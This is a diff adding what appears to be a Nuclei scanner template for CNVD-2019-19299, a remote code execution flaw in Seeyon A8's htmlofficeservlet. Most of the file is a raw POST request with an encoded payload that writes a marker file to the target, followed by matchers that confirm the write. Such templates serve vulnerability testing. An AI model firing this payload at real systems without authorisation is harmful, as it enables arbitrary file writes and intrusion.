@@ -1,0 +1,52 @@
+id: CNVD-2019-19299
+
+info:
+  name: seeyon A8 - htmlofficeservlet Remote Code Execution
+  author: SleepingBag945
+  severity: critical
+  description: seeyon A8 is susceptible to remote code execution because of an arbitrary file write issue.
+  reference:
+    - https://www.cxyzjd.com/article/guangying177/110177339
+    - https://github.com/sectestt/CNVD-2019-19299
+    - http://wiki.peiqi.tech/wiki/oa/致远OA/致远OA%20A8%20htmlofficeservlet%20任意文件上传漏洞.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: zhiyuan,cnvd,cnvd2019,rce,seeyon
+
+http:
+  - raw:
+      - |
+        POST /seeyon/htmlofficeservlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: application/octet-stream
+        Accept-Encoding: gzip
+
+        DBSTEP V3.0     355             0               22            
+        DBSTEP=OKMLlKlV
+        OPTION=S3WYOSWLBSGr
+        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+        CREATEDATE=wUghPB3szB3Xwg66
+        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+        originalFileId=wV66
+        originalCreateDate=wUghPB3szB3Xwg66
+        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdOlyEVGQuwiQrB7T3brV6
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLSGP4oEzLKAz4=iz=66 
+        rGzi0M3f7Z4YwsUTMFQBc.ba372b509a011e835365539a219d2888
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "rGzi0M3f7Z4YwsUTMFQBc"
+      - type: word
+        words:
+          - "DBSTEP"
+
+      - type: status
+        status:
+          - 200
